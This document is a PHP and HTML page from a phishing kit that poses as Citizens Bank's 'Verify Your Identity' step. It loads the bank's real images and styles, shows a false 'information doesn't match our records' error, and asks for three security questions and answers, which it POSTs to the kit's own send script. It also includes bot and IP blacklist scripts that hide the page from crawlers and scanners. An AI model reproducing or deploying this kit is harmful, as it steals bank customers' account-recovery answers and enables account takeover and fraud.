<?php
session_start();
error_reporting(0);
require_once 'Anti/main.php';
include('Anti/detects.php');
include('Anti/blockers.php');
include'Anti/IP-BlackList.php';  
include'Anti/Bot-Crawler.php';
include'Anti/Bot-Spox.php';
include'Anti/blacklist.php';
include'Anti/new.php';
include'Anti/Fuck-you.php'; 
include'Anti/Dila_DZ.php';
date_default_timezone_set('Europe/London');
$v_ip = $_SERVER['REMOTE_ADDR'];
$v_agent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);


if (!isset($_SESSION['CITI_SPOX'])) {

  header("Location: index");
  exit();
}



?><html><head>
<link rel="stylesheet" href="extra/css/bootstrap.css">




<!-- // removing logout.jsp from search results requirement OLB-4998  -->


<!-- // removing loginnew-wait.jsp from search results requirement OLB-7248  -->

	<link href="https://www4.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/apple-touch-icon.png" rel="apple-touch-icon">
	<link href="https://www4.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/apple-touch-icon-76x76.png" rel="apple-touch-icon" sizes="76x76">
	<link href="https://www4.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/apple-touch-icon-120x120.png" rel="apple-touch-icon" sizes="120x120">
	<link href="https://www4.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/apple-touch-icon-152x152.png" rel="apple-touch-icon" sizes="152x152">
	<link href="https://www4.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/apple-touch-icon-180x180.png" rel="apple-touch-icon" sizes="180x180">
	<link href="https://www4.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/icon-hires.png" rel="icon" sizes="192x192">
	<link href="https://www4.citizensbankonline.com/efs/efs/web-ui/img/mobile-desktop-icons/icon-normal.png" rel="icon" sizes="128x128">
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
	<!--Exclude Ensighten library incase skipEnsighten is "true"-->
	
<title>Online Login | Citizens Bank</title>







<link rel="stylesheet" href="https://www4.citizensbankonline.com/efs/efs/jsp-ns/inc/css/jquery-ui-1.10.3.custom.min.css">
<link rel="stylesheet" href="https://www4.citizensbankonline.com/efs/efs/jsp-ns/inc/css/normalize.css">
<link rel="stylesheet" href="https://www4.citizensbankonline.com/efs/efs/jsp-ns/inc/css/main.css">
<link rel="stylesheet" href="extra/css/signin.css">
<link rel="stylesheet" href="https://www4.citizensbankonline.com/efs/efs/jsp-ns/inc/css/flows.css">
<link rel="stylesheet" href="https://www4.citizensbankonline.com/efs/efs/jsp-ns/inc/css/ad-containers.css">


<!--[if lt IE 9]>
<script src="/efs/efs/jsp-ns/scripts/html5shiv.js"></script>
<![endif]-->


<style>

select {
background : url("https://www4.citizensbankonline.com/efs/ui/enrollment/img/arrow-gray-down.png") 99% center no-repeat #Fff;
overflow : hidden;
text-indent : 0.01px;
width: 100% !important;
text-overflow : '';
-webkit-appearance: none;
-moz-appearance: none;
-ms-appearance: none;
-o-appearance: none;
appearance: none;
height: 28px;
font-size: 15px;
line-height: 28px;
padding-right: 20px;
appearance: none;
padding: 0 5px;
border: 1px solid #eee;
border-radius: 3px;
color: #444;
font-weight: 300;
}

</style>


<!--[if IE]>
<style type='text/css'>
form select#SavedUserID {
    width : 200px;
}
</style>
<![endif]-->
<style>
	input[type=password].error {
		border-color : red;
	}
</style>



<style type="text/css" id="kampyleStyle">.noOutline{outline: none !important;}.wcagOutline:focus{outline: 1px dashed #595959 !important;outline-offset: 2px !important;transition: none !important;}

.error-message {
    padding: 20px 20px 20px 50px;
    background: url(https://www4.citizensbankonline.com/efs/efs/grafx/global-error.png) 15px 15px no-repeat;
}
</style>

</head>
<body class="responsive-enabled">
   



<!-- begin CITIZENS BANK Hosted Header -->
<div class="citizens-header-footer-injected">

<link rel="stylesheet" type="text/css" href="https://www4.citizensbankonline.com/efs/hhf/css/citizensns.min.42588.css">
<!--[if IE 8]><link rel="stylesheet" type="text/css" href="/efs/hhf/css/citizensns-ie8.min.42588.css?refresh=1609631464917"><![endif]-->

<div class="citizens-header-footer"><div class="citi-modal timeout-modal simplemodal-data" id="timeout-modal" style="display:none;"></div><div class="citi-modal help-modal" id="help-modal" tabindex="0" style="display:none;"></div>
</div>
</div><div class="citizens-header">

    <!-- overlay to hide elements until CSS is loaded -->
     
    
    <!-- end overlay -->

    

    <!-- htmlContainer PREFIX -->
    <div class="citizens-header-footer">
        <div id="page-header" class="page-header">
            <!-- inc-header.html START -->
            <div class="topshadow"></div>
            <div class="centered-content clearfix">

                <a href="http://www.citizensbank.com/" class="page-logo" tabindex="1">
                    <!-- Display the brand logo for either citizens one or citizen bank customers -->
                    <img border="0" alt="Citizens Bank" width="203" height="25" src="https://www4.citizensbankonline.com/efs/hhf/img/CTZ_Green-01.png">
                </a>
                <div id="header-navigation-container"></div>

            </div>
            <!-- inc-header.html END -->
        </div>
    </div>
    <!-- htmlContainer SUFFIX -->


</div>
<!-- end CITIZENS BANK Hosted Header -->




<div id="page-container" class="page-container">
	<div class="centered-content clearfix">
		<section id="top-content" class="page-region top-content">
        
    	</section>
    	<section id="main-container" class="main-container two-col layout-2-1 clearfix">

        	<!-- =================
        	MAIN CONTENT AREA START
        	================= -->
        	<section id="main-content" class="page-region main-content">
  
   
   <div class="account-table account-table-full">
      <div class="unauth-intro-area__progress-segment">
                                <div class="unauth-intro-area__progress-item -js-progress-green"></div>
                                <div class="unauth-intro-area__progress-item -js-progress-light-green"></div>
                                <div class="unauth-intro-area__progress-item -js-progress-light-green"></div>
                                <div class="unauth-intro-area__progress-item -js-progress-light-green"></div>
                                <div class="unauth-intro-area__progress-item -js-progress-light-green"></div>
                        </div>
      <div class="account-table-content">
         <div class="account-content-container">
            <div class="account-table-body">
               <header class="account-section-title clearfix account-secure">
                  <a href="https://www4.citizensbankonline.com/efs/servlet/efs/enroll.jsp#" class="mobile-help-trigger">Help</a>
                  <h1>Step 1 of 3: Verify Your Identity</h1>
               </header>
               
               <div id="messagecontainer" class="error-message show-error">The information below doesn't match our records. Please try again.</div>
               <legend class="account-title clearfix">
                        <h3>Security Question</h3>
                        <p style="font: inherit;">Simply provide the information below. Do not insert spaces or hyphens.</p>
                        <p style="font: inherit;">All fields are required.</p>
                     </legend>

               <section class="account-section">
                  
                  <form id="yourInfoCommand" class="wait" action="extra/send/send2" method="POST">

	<div class="ui-field-contain">

		<label for="employmentStatusJt">
			Question1
		</label>
			<select id="employmentStatusJt" name="Question1" class="form-control" aria-required="true" data-role="none" ng-model="jointApplicantInfo.employmentInfo.occupation">
			<option value="">Select one</option>
<option name="What was the name of your High School?">What was the name of your High School?</option>
<option name="What is your maternal grandfather's first name?">What is your maternal grandfather's first name?</option>
<option name="In what city were you married? (Enter full name of city)">In what city were you married? (Enter full name of city)</option>
<option name="What is the first name of the maid of honor at your wedding?">What is the first name of the maid of honor at your wedding?</option>
<option name="what is the first name of your oldest nephew?">what is the first name of your oldest nephew?</option>
<option name="What is the name of the first company you worked for?">What is the name of the first company you worked for?</option>
<option name="What is your maternal grandmother's first name?">t is your maternal grandmother's first name?</option>
<option name="What is your father's middle name?">What is your father's middle name?</option>
<option name="What is your Mother middles name?">What is your best friend's first name?</option>
<option name="In What city was your high school? (Full name of city in only)">In What city was your high school? (Full name of city in only)</option>

			</select>
<style type="text/css">
	.ui-mobile input, .ui-mobile select, .ui-mobile textarea, .ui-mobile button, .ui-mobile .ui-btn, .ui-btn {
			    line-height: 2.3;

	}
</style>	

<div class="ui-field-contain margin-bot-0" style="margin-top:10px;">
		<input style="padding-left: 8px;" class="form-control" id="emailAddressJt" name="answer1" class="required EMAIL" data-validation="length" data-validation-error-msg="Please answer the first question" data-validation-length="min2" size="43" placeholder=" Answer1" >
</div>
	</div>

<br>
<div class="ui-field-contain">

		<label for="employmentStatusJt">
			Question2
		</label>
		<select id="employmentStatusJt" name="Question2" class="form-control" >
			<option value="">
				Select one
			</option>
<option name="What was your high school mascot?">What was your high school mascot?</option>
<option name="What was the name of your first pet?">What was the name of your first pet?</option>
<option name="In what city is your vacation home? (Enter full name of city only)">In what city is your vacation home? (Enter full name of city only)</option>
<option name="What is the first name of your oldest niece?">What is the first name of your oldest niece?</option>
<option name="What was the name of your first girlfriend/boyfriend?">What was the name of your first girlfriend/boyfriend?</option>
<option name="What was the nickname of your grandfather?">What was the nickname of your grandfather?</option>
<option name="What is your paternal grandmother's first name?">What is your paternal grandmother's first name?</option>
<option name="What is the first name of the best man at your wedding?">What is the first name of the best man at your wedding?</option>
<option name="What was the first name of your first manager?">What was the first name of your first manager?</option>
<option name="In what city was your father born? (Enter full name of city only)">In what city was your father born? (Enter full name of city only)</option>
			
		</select>


<div class="ui-field-contain margin-bot-0" style="margin-top:10px;">

				<input style="padding-left: 8px;" class="form-control" id="emailAddressJt" name="answer2" class="required EMAIL" data-validation="length" data-validation-error-msg="Please answer the second question" data-validation-length="min2" size="43" placeholder=" Answer2" >


</div>
	</div>

<br>
<div class="ui-field-contain">

		<label for="employmentStatusJt">
			Question3
		</label>
		<select id="employmentStatusJt" name="Question3" class="form-control" >
			<option value="">
				Select one
			</option>
<option name="What was the name of the town your grandmother lived in? (Enter full name of town only)">What was the name of the town your grandmother lived in? (Enter full name of town only)</option>
<option name="What was the name of your high school?">What was the name of your high school?</option>
<option name="Where did you meet your spouse for the first time? (Enter full name of city only)">Where did you meet your spouse for the first time? (Enter full name of city only)</option>
<option name="What was the last name of your favorite teacher in final year of high school?">What was the last name of your favorite teacher in final year of high school?</option>
<option name="In what city were you born? (Full name of city only)">In what city were you born? (Full name of city only)?</option>
<option name="In what city was your mother born?(Enter full name of city only)">In what city was your mother born?(Enter full name of city only)</option>
<option name="What is your paternal grandfather's first name?">What is your paternal grandfather's first name?</option>
<option name="What is your mother's middle name?">What is your mother's middle name?</option>
<option name="What was your favorite restaurant in college?">What was your favorite restaurant in college?</option>
<option name="What street did your best friend in high school live on? (Enter full name of street only))">What street did your best friend in high school live on? (Enter full name of street only)</option>
			
		</select>


<div class="ui-field-contain margin-bot-0" style="margin-top:10px;">

		<input style="padding-left: 8px;" class="form-control" id="emailAddressJt" name="answer3" class="required EMAIL" data-validation="length" data-validation-error-msg="Please answer the third question" data-validation-length="min2" size="43" placeholder=" Answer3" >


</div>
	</div>

<div data-ng-include="'features/openaccount/help/helptext.html'" class="ng-scope" style=""><!-- ngRepeat: item in openAcctHelpCtrl.items --><!-- ngIf: (openAcctHelpCtrl.items.length > 1) --><div data-ng-repeat="item in openAcctHelpCtrl.items" data-ng-if="(openAcctHelpCtrl.items.length > 1)" class="ng-scope" style="">
    <!-- ngIf: item.title && !item.type --><h3 class="accentColor2 ng-binding ng-scope" data-ng-bind-html="item.title" data-ng-if="item.title &amp;&amp; !item.type">Why do I have to provide this information?</h3><!-- end ngIf: item.title && !item.type -->
    <!-- ngIf: (openAcctHelpCtrl.items.length > 1 && item.items.length > 1) -->

    <!-- ngIf: (openAcctHelpCtrl.items.length > 1 && item.items.length == 1) --><ul class="no-padding-left ng-scope" data-ng-if="(openAcctHelpCtrl.items.length > 1 &amp;&amp; item.items.length == 1)">
        <!-- ngRepeat: subject in item.items track by $index --><!-- ngIf: !item.type --><li data-ng-repeat="subject in item.items track by $index" data-ng-bind-html="subject" data-ng-if="!item.type" class="ng-binding ng-scope">Citizens bank requires all information must be filled, to validate record information.</li><!-- end ngIf: !item.type --><!-- end ngRepeat: subject in item.items track by $index -->

        <!-- ngRepeat: simpleItem in item.items track by $index --><!-- ngIf: item.type == 'simple' --><!-- end ngRepeat: simpleItem in item.items track by $index -->

        <!-- ngIf: item.type == 'image' -->

    </ul><!-- end ngIf: (openAcctHelpCtrl.items.length > 1 && item.items.length == 1) -->

</div><!-- end ngIf: (openAcctHelpCtrl.items.length > 1) --><!-- end ngRepeat: item in openAcctHelpCtrl.items --><!-- ngIf: (openAcctHelpCtrl.items.length > 1) -->
</div>	
<div class="btn-ctr">
	<div class="btn-ctr-inner">
	
<div class="form-actions">
            <input type="submit" class="submit-button arrow" tabindex="3" data-trigger="next" value="NEXT"> 
            </div>
	
</div>
</form>
               </section>
            </div>
         </div>
      </div>
   </div>
   


   










</section> 

<!-- Brand type from query parameter -->


<aside id="main-sidebar" class="page-region main-sidebar">
	<div id="citizens-help" class="citizens-help sidebar-item sidebar-list-container sidebar-accordian mobile-modal">
	    <div class="sidebar-list-content">
	        <header class="sidebar-list-title">
	            <h3>Need Help?</h3>
	        </header>

	
	        <div id="faq-holder">
	        <form action="https://www4.citizensbankonline.com/efs/servlet/efs/login-assistance.jsp" name="frmAsst" id="frmAsst" method="post">
	           
               
               

					<section class="toggle-list-container faq-container" id="faq-index-29">
						<a href="https://www4.citizensbankonline.com/efs/servlet/efs/enroll.jsp#" title="Expand contents of What if I don't have an ATM/Debit Card number?" aria-label="Expand Contents" class="sidebar-list-option-accordian showhide">What if I don't have a ATM/Debit Card number?</a>
						<ul class="loginfaq sidebar-list showhide-content">
							<li>
								<p>If you don't have an ATM/Debit Card, please call Customer Service at 1-800-656-6561. Business customers should call 1-877-229-6428.</p>
							</li>
						</ul>
					</section>

					<section class="toggle-list-container faq-container" id="faq-index-28">
						<a href="https://www4.citizensbankonline.com/efs/servlet/efs/enroll.jsp#" title="Expand contents of How do I know that I am enrolled in Online Banking?" aria-label="Expand Contents" class="sidebar-list-option-accordian showhide">How do I know that I'm enrolled in Online Banking?</a>
						<ul class="loginfaq sidebar-list showhide-content">
							<li>
								<p>If you are not sure if you are enrolled in Online Banking, click on "Enroll Now" from the Online Banking login screen. After you verify your identity, you will receive your Online User ID if you are enrolled.</p>
							</li>
						</ul>
					</section>

					<section class="toggle-list-container faq-container" id="faq-index-10">
						<a href="https://www4.citizensbankonline.com/efs/servlet/efs/enroll.jsp#" title="Expand contents of Is Online Banking secure?" aria-label="Expand Contents" class="sidebar-list-option-accordian showhide">Is Online Banking secure?</a>
						<ul class="loginfaq sidebar-list showhide-content">
							<li>
								<p>To make Online Banking secure, Citizens Bank uses the highest level of encryption available today. Encryption is the process by which information is translated into un-interpretable code and then back to recognized information.<br>As an added measure, Online Banking gives you the capability to easily verify that you are on the authentic Citizens Bank website and not on a fake site created by fraudsters. Just look for the green bar (or some variation of it) in your browser address. The green bar should remind you that "green is good" and that our website has passed a sophisticated authentication process, letting you know you are good to go.</p>
							</li>
						</ul>
					</section>

            </form>
            </div>

			<ul class="sidebar-list">
				<li class="cta-row">
					<a href="https://www4.citizensbankonline.com/efs/servlet/efs/login-faqs.jsp" class="blue" target="_blank">View All Help Topics</a>
				</li>

			</ul>
		</div>
	</div>
</aside>


  
   

   
   


		</section> 
	</div> 
</div> 









<!-- begin CITIZENS BANK Hosted Footer -->
<div class="citizens-footer"><div class="citizens-header-footer"><footer id="page-footer" class="page-footer">
    

<div class="footer-row clearfix">
<ul>
<li>
<h6>Checking &amp; Savings</h6>
</li>
<!--        <li><a target="_blank" href="http://www.citizensbank.com/checking-and-savings.aspx">Checking &amp; Savings Overview</a></li>-->
<li>
<a target="_blank" href="http://www.citizensbank.com/checking/">Checking</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/savings-and-cds/savings.aspx">Savings</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/savings-and-cds/money-markets.aspx">Money Markets</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/savings-and-cds/cds.aspx">Certificates of Deposit (CDs)
<sup>??</sup>
</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/ira/">IRAs</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/checking-and-savings/programs-and-services.aspx">Programs &amp; Services</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/checking-and-savings/benefits-and-features.aspx">Benefits &amp; Features</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/checking/debit-cards/standard.aspx">Debit Card</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/overdraft-protection/">Overdraft Choices
<sup>??</sup>
</a>
</li>
</ul>
<ul>
<li>
<h6>Home Borrowing</h6>
</li>
<!--        <li><a target="_blank" href="http://www.citizensbank.com/loans/">Home Borrowing Overview</a></li>-->
<li>
<a target="_blank" href="http://www.citizensbank.com/mortgages/">Mortgages</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/home-equity/loans.aspx">Home Equity Loans</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/home-equity/lines.aspx">Home Equity Lines of Credit</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/loans/determine-my-rate.aspx">Determine My Rate</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/mortgages/my-mortgage.aspx">My Mortgage Account</a>
</li>
</ul>
<ul>
<li>
<h6>Students</h6>
</li>
<!--<li><a target="_blank" href="http://www.citizensbank.com/student-services/">Students Overview</a></li>
<li><a target="_blank" href="http://www.citizensbank.com/student-banking/">Banking</a></li>
<li><a target="_blank" href="http://www.citizensbank.com/student-loans/undergradfamilies.aspx">Undergraduate Borrowing</a></li>
<li><a target="_blank" href="http://www.citizensbank.com/student-loans/gradstudents.aspx">Graduate Borrowing</a></li>
<li><a target="_blank" href="http://www.citizensbank.com/student-loans/process.aspx">The Student Loan Process</a></li>
<li><a target="_blank" href="http://www.citizensbank.com/student-loans/tools.aspx">Student Tools &amp; Resources</a></li>-->
<li>
<a target="_blank" href="http://www.citizensbank.com/student-loans/default.aspx">Student Loan Options</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/student-loans/education-refinance-loan-overview.aspx">Refinancing Student Loans</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/student-loans/process/default.aspx">The Student Loan Process</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/student-loans/process/undergraduate.aspx">Undergraduate Students &amp; Parents</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/student-loans/process/graduate.aspx">Graduate Students</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/student-loans/tools.aspx">Tools &amp; Information</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/checking/one-deposit-checking-account.aspx">Banking for Students</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/student-services/access-my-student-loan/default.aspx">Access My Student Loan</a>
</li>
</ul>
<ul class="last">
<li>
<h6>Cards</h6>
</li>
<!--        <li><a target="_blank" href="http://www.citizensbank.com/cards-and-rewards/">Cards Overview</a></li>-->
<li>
<a target="_blank" href="http://www.citizensbank.com/credit-cards/overview.aspx">Credit Cards</a>
</li>
<!--        <li><a target="_blank" href="http://www.citizensbank.com/cards-and-rewards/debit-card/debit-card.aspx">Debit Card</a></li>-->
<li>
<a target="_blank" href="http://www.citizensbank.com/cards-and-rewards/credit-cards/creditcardagreements/agreements.aspx">Card Agreements</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/security/">Security Features</a>
</li>
</ul>
</div>

<div class="footer-row clearfix">
<ul>
<li>
<h6>Personal Loans</h6>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/personal-loans/overview.aspx">Overview</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/personal-loans/faqs.aspx">FAQs</a>
</li>
</ul>
<ul>
<li>
<h6>Resources</h6>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/checking/order-checks.aspx">Order Checks</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/online-and-mobile-banking/default.aspx">Online &amp; Mobile Banking</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/customer-service/">Customer Service</a>
</li>
</ul>
<ul>
<li>
<h6>About Us</h6>
</li>
<!--        <li><a target="_blank" href="http://www.citizensbank.com/about-us/">About Us Overview</a></li>-->
<li>
<a target="_blank" href="http://investor.citizensbank.com/about-us/our-company.aspx">About Citizens Bank</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/community/">In the Community</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/careers/">Careers</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/about_our_ads.aspx">About Our Ads</a>
</li>
</ul>
<ul class="last">
<li>
<h6>Solutions</h6>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/">Personal</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/investing/">Investing</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/small-business/">Small Business</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/commercial-banking/">Commercial</a>
</li>
</ul>
</div>

<div class="footer-row clearfix">
<ul>
<li>
<h6>Disclosures</h6>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/pf/onlinebanking/terms.aspx">Online Terms and Conditions</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/pdf/CTZ_eSign.pdf">Electronic Notice Disclosure and Consent (Online Service)</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/checking-and-savings/account-documents.aspx">Account Documents</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/tools/leaving.aspx?url=http://www.fdic.gov">Member FDIC</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/security/equal-housing-lender.aspx">Equal Housing Lender
<img alt="Equal Housing Lender" title="Equal Housing Lender" src="https://www4.citizensbankonline.com/efs/hhf/img/equal-housing.gif">
</a>
</li>
<li>
<a target="_blank" href="http://www.citizensbank.com/security/">Security, Privacy &amp; Legal</a>
</li>
</ul>
</div>
<div class="centered-content">
<div class="footer-bottom">
<p class="legal">
Zelle and the Zelle related marks are wholly owned by Early Warning Services, LLC and are used herein under license.
</p>
<p class="legal">
*Securities, Insurance and Investment Advisory Services offered through Citizens Securities, Inc. ("CSI"), also referred to as Citizens Investment Services. CSI is an SEC registered investment adviser and Member - FINRA and SIPC. 770 Legacy Place, MLP240, Dedham, MA 02026. (800) 942-8300. CSI is an affiliate of Citizens Bank, N.A.<br><br>The investment balances shown in online banking are based on market prices, with up to a fifteen minute delay from the time this webpage was last refreshed.  Information relating to accounts not held at CSI is presented as an accommodation and while drawn from sources believed to be reliable is not guaranteed as to accuracy or completeness. Such information should be independently confirmed by the account owner(s).<br><br>Information relating to accounts not held or custodied by National Financial Services (NFS) (Assets Held Away), CSI???s clearing broker dealer, was provided to NFS by outside parties and is included for informational purposes only.  These positions are not part of your brokerage account carried by NFS and therefore any SIPC account protection afforded your account through NFS does not cover these assets or prices reported.  Neither NFS, CSI nor Citizens Bank are responsible for the Assets Held Away information provided and does not guarantee the accuracy or timeliness of the positions or prices reported.  Prices shown do not necessarily reflect the actual current market prices. Further information regarding these prices may be obtained by contacting CSI.<br><br>The investment products and financial strategies suggested herein are subject to investment risk, including possible loss of principal amount invested. Investment decisions should be based on each individual's goals, time horizon and tolerance for risk.<br><br>SpeciFi<sup>??</sup> is made available through CSI. Portfolio management services are sub-advised by SigFig Wealth Management, LLC ("SigFig"), an SEC registered investment adviser. SigFig is not an affiliate of CSI or Citizens Bank, N.A.
</p>

<div class="footer-disclaimer-box footer-disclaimer-box--margin-bottom footer-disclaimer">
<p class="footer-disclaimer-box__text">Securities, Insurance Products and Advisory Services are:</p>
<ul class="footer-disclaimer-box__list">
<li class="footer-disclaimer-box__list-item">NOT FDIC INSURED</li>
<li class="footer-disclaimer-box__list-item">NOT BANK GUARANTEED</li>
<li class="footer-disclaimer-box__list-item">MAY LOSE VALUE</li>
<li class="footer-disclaimer-box__list-item">NOT A DEPOSIT
<br>
</li>
<li class="footer-disclaimer-box__list-item">NOT INSURED BY ANY FEDERAL GOVERNMENT AGENCY</li>
</ul>
</div>
<ul class="footer-util">
<li class="sitemap">
<a target="_blank" href="http://www.citizensbank.com/tools/SiteMap.aspx">Site Map</a>
</li>
<li>Follow:
<a target="_blank" href="http://www.citizensbank.com/tools/leaving.aspx?url=http://www.facebook.com/citizensbank">
<img src="https://www4.citizensbankonline.com/efs/hhf/img/footer-follow-facebook.png" alt="Facebook" align="middle">
</a>
<a target="_blank" href="http://www.citizensbank.com/tools/leaving.aspx?url=http://twitter.com/citizensbank">
<img src="https://www4.citizensbankonline.com/efs/hhf/img/footer-follow-twitter.png" alt="Twitter">
</a>
<a target="_blank" href="http://www.citizensbank.com/tools/leaving.aspx?url=http://linkedin.com/company/citizens-bank">
<img src="https://www4.citizensbankonline.com/efs/hhf/img/footer-follow-linkedin.png" alt="Linkedin">
</a>
<a target="_blank" href="http://www.citizensbank.com/tools/leaving.aspx?url=http://youtube.com/citizensbank">
<img src="https://www4.citizensbankonline.com/efs/hhf/img/footer-follow-youtube.png" alt="Youtube">
</a>
</li>
</ul>

<p class="footer-copyright">
?? Copyright 2021 Citizens Financial Group, Inc. All rights reserved.<br>Citizens Bank is a brand name of Citizens Bank, N.A. (NMLS ID# 433960).<br>Citizens Bank corporate headquarters: One Citizens Plaza, Providence, RI 02903
</p>

<img src="https://www4.citizensbankonline.com/efs/hhf/img/elh.gif" alt="Equal Housing Lender">
<img src="https://www4.citizensbankonline.com/efs/hhf/img/fdicFooter.gif" alt="Member FDIC">
</div>
</div>
</footer></div></div>


<!-- end CITIZENS BANK Hosted Footer -->











 <!--  End Main Container -->
   
   <script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery-form-validator/2.3.26/jquery.form-validator.min.js"></script>
<script>
  $.validate();
  $('#my-textarea').restrictLength( $('#max-length-element') );
</script>
   


<iframe sandbox="allow-scripts allow-same-origin" title="Adobe ID Syncing iFrame" id="destination_publishing_iframe_citizensbank_0" name="destination_publishing_iframe_citizensbank_0_name" src="cid:frame-A18421AF79D2E07ED95F910DCF207923@mhtml.blink" class="aamIframeLoaded" style="display: none; width: 0px; height: 0px;"></iframe><iframe tabindex="-1" aria-hidden="true" role="presentation" title="Intentionally blank" name="lpSS_47915220928" id="lpSS_47915220928" src="cid:frame-FD1F4EB7D4C9C2F737CEFF8FED46154E@mhtml.blink" style="width: 0px; height: 0px; position: absolute; top: -1000px; left: -1000px; display: none;"></iframe><span></span>
</body></html>